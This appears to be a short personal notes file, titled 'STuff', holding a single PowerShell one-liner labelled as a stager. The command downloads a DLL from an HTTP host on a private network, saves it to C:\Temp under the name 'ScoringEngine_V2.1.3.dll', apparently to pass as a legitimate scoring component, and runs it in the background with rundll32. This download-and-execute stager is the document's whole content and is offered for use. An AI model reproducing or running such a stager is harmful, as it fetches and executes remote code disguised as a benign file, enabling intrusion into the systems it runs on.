# STuff


## Oneliner Stager run hosted .DLL in background:
```
mkdir C:\Temp -ErrorAction SilentlyContinue; Invoke-WebRequest -Uri 'http://10.20.X.X:8081/ScoringEngine_V2.1.3.dll' -OutFile 'C:\Temp\ScoringEngine_V2.1.3.dll'; rundll32 C:\Temp\ScoringEngine_V2.1.3.dll, Start

```